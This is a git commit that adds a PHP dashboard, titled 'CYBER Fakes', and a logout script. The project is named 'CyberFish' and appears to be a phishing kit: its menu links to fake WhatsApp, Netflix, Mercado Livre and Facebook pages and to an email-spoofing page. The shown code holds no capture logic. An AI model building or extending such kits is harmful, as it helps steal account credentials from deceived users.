bc45e1778416a641de189f0235551270aa844171
Cyber_Root0 <70926805+Cyber-Root0@users.noreply.github.com>
2021-01-12 21:47:57 -0300

    DASHBOARD - HTML, CSS, PHP
    DASHBOARD - HTML, CSS, PHP

---
+++ CyberFish/index.php
@@ -0,0 +1,58 @@
+﻿<!DOCTYPE html>
+
+<html lang="pt-BR">
+
+<head>
+    
+<meta charset="UTF-8">
+    
+<meta name="viewport" content="width=device-width, user-scalable=no">
+    
+<title>CYBER - Fakes</title>
+    
+<link rel="icon" href="https://i.ibb.co/SfQsfvq/pp.jpg">
+<link rel="stylesheet" href="css/fakes.css">
+
+</head>
+
+<body>
+    
+<header>
+        
+<h1>CYBER Fakes</h1>
+        
+<div id="sair">
+            
+<a href="logout.php">Sair</a>
+        
+</div>
+    
+</header>
+    
+<nav>
+        
+<ul>
+            
+<li><a href="WhatsApp/index.html">WhatsApp</a></li>
+            
+<li><a href="Netflix/index.html">Netflix</a></li>
+            
+<li><a href="Mercado/index.html">Mercado Livre</a></li>
+            
+<li><a href="Facebook/index.html">Facebook</a></li>
+            
+<li><a href="Email_Spoof/index.php">Email</a></li>
+            
+<li><a href="#">Xvideo RED</a></li>
+        
+</ul>
+    
+</nav>
+    
+<footer>
+        
+<span></span>
+    
+</footer>
+</body>
+</html>
---
+++ CyberFish/logout.php
@@ -0,0 +1,8 @@
+<?php
+
+session_start();
+
+unset($_SESSION['id']);
+
+header("Location:index.php");
+?>
